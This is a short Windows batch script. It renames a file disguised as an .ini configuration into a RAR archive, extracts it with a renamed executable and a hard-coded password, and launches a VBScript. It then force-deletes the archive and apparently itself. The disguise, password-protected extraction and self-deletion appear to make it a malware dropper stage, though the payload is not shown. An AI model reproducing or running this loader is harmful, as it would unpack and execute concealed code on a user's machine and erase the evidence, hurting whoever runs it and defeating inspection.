@Echo off
cd C:\ssd\onset
rename 58nfs.ini 01s.rar
"15sp.exe" e -psion0811 01s.rar
timeout 5

start Ztestram.vbs
timeout 4
del /f /q "01s.rar"
del /f /q "81ldp.bat"
@exit